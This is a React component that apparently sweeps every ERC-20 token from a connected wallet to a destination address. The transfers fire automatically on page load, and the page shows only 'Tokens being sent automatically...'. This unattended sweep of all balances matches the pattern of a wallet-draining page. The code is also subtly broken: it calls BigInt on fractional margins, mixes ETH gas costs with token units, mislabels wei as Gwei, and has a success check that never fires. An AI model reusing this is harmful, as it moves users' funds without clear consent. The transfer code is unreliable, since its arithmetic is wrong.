import { useEffect, useCallback } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { Interface } from 'ethers';

// Intégration avec l'API Etherscan pour récupérer les frais de gas
const getGasPriceFromEtherscan = async () => {
  const apiKey = process.env.ETHERSCAN_API_KEY;  // Utiliser la variable d'environnement pour la clé API
  const url = `https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${apiKey}`;
  
  const response = await fetch(url);
  const data = await response.json();

  if (data.status === "1") {
    return BigInt(data.result);  // Retourne les frais de gas actuels en Gwei
  } else {
    throw new Error("Erreur lors de la récupération des frais de gas");
  }
};

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const sendAllTokens = useCallback(async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    // Vérifier si l'adresse de destination est une adresse ENS
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: destinationAddress,
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    // Récupérer le solde d'ETH de l'utilisateur
    const ethBalance = await publicClient.getBalance(walletClient.account);

    // Récupérer les frais de gas depuis Etherscan
    let gasPrice;
    try {
      gasPrice = await getGasPriceFromEtherscan();
    } catch (err) {
      console.error("Impossible de récupérer les frais de gas", err);
      return;
    }

    // Fonction pour envoyer un token en tenant compte des frais de gas
    const sendTokenWithGasMargin = async (tokenAddress: `0x${string}`, margin: number) => {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) return;

      try {
        // Utilisation d'ethers.js v6 pour encoder les données de la fonction
        const iface = new Interface(erc20ABI); // Utiliser Interface de ethers/lib/utils
        const data = iface.encodeFunctionData('transfer', [
          destinationAddress as `0x${string}`,
          BigInt(token.balance),
        ]);

        const gasEstimate = await publicClient.estimateGas({
          account: walletClient.account,
          to: tokenAddress,
          data: data,  // Passer les données encodées ici
        });

        const totalGasCost = gasEstimate * gasPrice;
        const gasCostInEth = totalGasCost / BigInt(1e18);  // Convertir en ETH

        // Calculer le montant restant après déduction des frais de gas avec la marge
        const remainingBalance = BigInt(token.balance) - gasCostInEth * BigInt(margin);

        // Vérifier si l'utilisateur a suffisamment de fonds pour les frais de gas
        if (BigInt(ethBalance) < gasCostInEth) {
          console.error("Pas assez de fonds pour les frais de gas");
          return;
        }

        // Si le solde après frais est positif, on envoie la transaction
        if (remainingBalance > 0) {
          const response = await walletClient.writeContract({
            address: tokenAddress,
            abi: erc20ABI,
            functionName: 'transfer',
            args: [destinationAddress, remainingBalance],
          });

          // Mettre à jour l'état pour marquer le token comme envoyé
          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: response,
            },
          }));

        } else {
          console.error("Solde insuffisant après déduction des frais de gas");
        }

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
        return false; // Retourne false en cas d'erreur
      }
    };

    // Tenter l'envoi avec différentes marges pour les frais de gaz (0%, 30%, 100%)
    for (let attempt = 1; attempt <= 3; attempt++) {
      let margin = 0;

      if (attempt === 1) {
        margin = 1; // Premier envoi avec frais de gaz juste suffisants
      } else if (attempt === 2) {
        margin = 1.3; // Deuxième envoi avec 30% de marge
      } else if (attempt === 3) {
        margin = 2; // Troisième envoi avec 100% de marge
      }

      for (const tokenAddress of tokensToSend) {
        const result = await sendTokenWithGasMargin(tokenAddress, margin);
        if (result) {
          console.log("Token envoyé avec succès !");
          return; // Si l'envoi est réussi, on arrête les tentatives
        }
      }
    }
  }, [tokens, walletClient, destinationAddress, setCheckedRecords, setDestinationAddress, publicClient]);

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient, sendAllTokens, publicClient]);

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
